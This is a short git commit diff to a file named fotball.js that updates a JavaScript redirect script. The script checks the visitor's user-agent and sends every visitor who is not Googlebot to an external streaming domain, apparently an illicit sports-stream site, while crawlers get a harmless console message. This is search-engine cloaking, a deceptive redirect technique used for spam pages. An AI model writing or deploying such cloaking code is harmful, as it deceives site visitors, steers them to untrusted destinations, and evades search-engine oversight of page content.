1eeb56099d0d71d4f7aec90a3908bcbd02a78238
lamne07-hash <asifonline564@gmail.com>
2026-09-26 17:18:37 +0600

    Update fotball.js

--- fotball.js
+++ fotball.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sdhsaatv.pro/soccer/?m=Grenada vs Cuba";
+  window.location.href = "https://sdhsaatv.pro/f1/?m=Qatar+Airways+Azerbaijan+GP";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
